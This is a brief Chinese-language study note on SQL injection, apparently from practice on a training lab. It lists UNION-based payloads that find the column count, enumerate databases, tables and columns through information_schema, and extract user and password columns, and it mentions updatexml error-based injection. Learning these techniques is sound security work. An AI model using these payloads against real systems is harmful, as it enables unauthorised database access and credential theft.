# SQL注入

2021/09/12 18:13

## 使用union

`union`操作符

`select col_name from table union select col_name from table `

## 注入场景

1.  只有最后子句允许有`order by`
2.  只有最后子句允许有 `LIMIT`
3.  字段数和字段类型一样
4.  注入点有回显

## 实践

1.  `order by 确定字段数`→使用union联合查询
2.  `select `语句中可以嵌套`select`语句
    1.  库信息
        1.  查看数据库版本： `select version()`
        2.  读当前库名称：`datebase()`
        3.  读所有库使用的是sql里面内置的库 `select schema_name from information_schema.schemata`！只能显示一行
        4.  可以使用`group_concat()`显示在一行中
    2.  表信息
        1.  查询表名` select table_name from information_schema.tables where table_schema='security'`
        2.  读字段` select column_name from information_schema.columns where table_name='users'`

## updatexml报错注入

<https://www.jianshu.com/p/d8ae3e8dabdc>

![](https://upload-images.jianshu.io/upload_images/10148719-626260d9eacbebb3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1010/format/webp)

1.  `concat()` 函数多个字段变成一行
添加日期时间


2021/04/23 18:47

获取数据库

```sql
union select 1,2,database()
```

获取各种表

```sql
union select 1,2,group_concat(table_name)
from information_schema.tables where table_schema='security' 
```

获取表中的字段名

```sql
union select 1,2,group_concat(column_name)
from information_schema.columns where table_name='users' --+
```

根据找到的字段名开始获取数据

```sql
union select 1,user,password
from user 
```

